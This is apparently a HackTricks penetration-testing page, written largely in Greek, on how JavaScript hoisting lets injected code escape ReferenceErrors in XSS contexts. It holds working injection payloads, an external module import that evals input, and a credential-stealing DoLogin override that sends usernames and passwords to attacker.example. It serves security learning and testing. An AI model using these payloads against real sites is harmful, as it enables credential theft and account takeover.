# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Στη γλώσσα JavaScript, υπάρχει ένας μηχανισμός γνωστός ως **Hoisting** όπου οι δηλώσεις μεταβλητών, συναρτήσεων, κλάσεων, ή imports τοποθετούνται εννοιολογικά στην κορυφή του scope τους πριν εκτελεστεί ο κώδικας. Αυτή η διαδικασία πραγματοποιείται αυτόματα από τη μηχανή JavaScript, η οποία διαπερνά το script σε πολλαπλές διελεύσεις.

Κατά την πρώτη διέλευση, η μηχανή parses τον κώδικα για να ελέγξει για syntax errors και τον μετασχηματίζει σε ένα abstract syntax tree. Αυτή η φάση περιλαμβάνει το hoisting, μια διαδικασία όπου ορισμένες δηλώσεις μετακινούνται στην κορυφή του execution context. Εάν η φάση parsing είναι επιτυχής, υποδεικνύοντας ότι δεν υπάρχουν syntax errors, η εκτέλεση του script προχωρά.

Είναι κρίσιμο να κατανοήσουμε ότι:

1. Το script πρέπει να είναι ελεύθερο από syntax errors για να πραγματοποιηθεί η εκτέλεση. Οι κανόνες σύνταξης πρέπει να τηρούνται αυστηρά.
2. Η τοποθέτηση του κώδικα μέσα στο script επηρεάζει την εκτέλεση λόγω του hoisting, αν και ο εκτελούμενος κώδικας μπορεί να διαφέρει από την κειμενική του αναπαράσταση.

#### Τύποι Hoisting

Βάσει των πληροφοριών από το MDN, υπάρχουν τέσσερις διαφορετικοί τύποι hoisting στο JavaScript:

1. **Value Hoisting**: Επιτρέπει τη χρήση της τιμής μιας μεταβλητής εντός του scope της πριν τη γραμμή δήλωσής της.
2. **Declaration Hoisting**: Επιτρέπει την αναφορά σε μια μεταβλητή εντός του scope πριν την δήλωσή της χωρίς να προκαλεί `ReferenceError`, αλλά η τιμή της μεταβλητής θα είναι `undefined`.
3. Αυτός ο τύπος αλλάζει τη συμπεριφορά εντός του scope λόγω της δήλωσης της μεταβλητής πριν από την πραγματική γραμμή δήλωσής της.
4. Οι παρενέργειες της δήλωσης συμβαίνουν πριν αξιολογηθεί το υπόλοιπο του κώδικα που την περιέχει.

Αναλυτικά, οι function declarations εμφανίζουν συμπεριφορά hoisting τύπου 1. Το keyword `var` επιδεικνύει συμπεριφορά τύπου 2. Οι lexical declarations, που περιλαμβάνουν τα `let`, `const` και `class`, δείχνουν συμπεριφορά τύπου 3. Τέλος, οι δηλώσεις `import` είναι μοναδικές καθώς hoisted με συμπεριφορές τύπου 1 και τύπου 4.

## Σενάρια

Επομένως, εάν έχετε σενάρια όπου μπορείτε να Inject JS code after an undeclared object χρησιμοποιείται, μπορείτε να fix the syntax δηλώνοντάς το (ώστε ο κώδικάς σας να εκτελεστεί αντί να προκαλέσει σφάλμα):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Περισσότερα Σενάρια
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Hoisting για παράκαμψη της διαχείρισης εξαιρέσεων

Όταν το sink είναι τυλιγμένο σε `try { x.y(...) } catch { ... }`, **ReferenceError** θα σταματήσει την εκτέλεση πριν τρέξει το payload σου. Μπορείς να προ-δηλώσεις τον ελλείποντα identifier ώστε η κλήση να επιβιώσει και η injected expression σου να εκτελεστεί πρώτη:
```javascript
// Original sink (x and y are undefined, but you control INJECT)
x.y(1,INJECT)

// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec
prompt()) ; function x(){} //
```
`function x(){}` ανυψώνεται πριν την αξιολόγηση, οπότε ο parser δεν ρίχνει πια σφάλμα στο `x.y(...)`. Το `prompt()` εκτελείται πριν επιλυθεί το `y` και, αφού τρέξει ο κώδικάς σου, ρίχνεται `TypeError`.

### Προλάβετε μεταγενέστερες δηλώσεις κλειδώνοντας ένα όνομα με const

Εάν μπορείτε να εκτελεστείτε πριν το top-level `function foo(){...}` αναλυθεί, η δήλωση ενός lexical binding με το ίδιο όνομα (π.χ. `const foo = ...`) θα αποτρέψει τη μεταγενέστερη δήλωση function από το να επαναδεσμεύσει αυτό το identifier. Αυτό μπορεί να καταχραστεί σε RXSS για να αρπάξετε κρίσιμους handlers που ορίζονται αργότερα στη σελίδα:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Σημειώσεις
- Αυτό βασίζεται στη σειρά εκτέλεσης και στο global (top-level) scope.
- Εάν το payload σας εκτελείται μέσα σε `eval()`, θυμηθείτε ότι οι `const/let` μέσα σε `eval` είναι block-scoped και δεν θα δημιουργήσουν global bindings. Εισαγάγετε ένα νέο `<script>` στοιχείο με τον κώδικα για να ορίσετε ένα πραγματικό global `const`.

### Δυναμικό import() με specifiers ελεγχόμενα από τον χρήστη

Εφαρμογές που renderάρονται server-side μερικές φορές προωθούν είσοδο χρήστη στο `import()` για lazy-load components. Εάν υπάρχει ένας loader όπως το `import-in-the-middle`, δημιουργούνται wrapper modules από τον specifier. Η hoisted αξιολόγηση του import προσπελαύνει και εκτελεί το module που ελέγχεται από τον επιτιθέμενο πριν εκτελεστούν οι επόμενες γραμμές, επιτρέποντας RCE σε SSR contexts (βλ. CVE-2023-38704).

### Εργαλεία

Οι σύγχρονοι scanners άρχισαν να προσθέτουν explicit hoisting payloads. **KNOXSS v3.6.5** καταγράφει τα test cases "JS Injection with Single Quotes Fixing ReferenceError - Object Hoisting" και "Hoisting Override"; το τρέξιμό του ενάντια σε RXSS contexts που ρίχνουν `ReferenceError`/`TypeError` εμφανίζει γρήγορα υποψήφιες hoist-based gadget.

## Αναφορές

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [XSS Exception Bypass using Hoisting (ch4n3, 2023)](https://new-blog.ch4n3.kr/xss-exception-bypass-using-hoisting/)
- [KNOXSS coverage – hoisting override cases](https://knoxss.pro/?page_id=766)

{{#include ../../banners/hacktricks-training.md}}
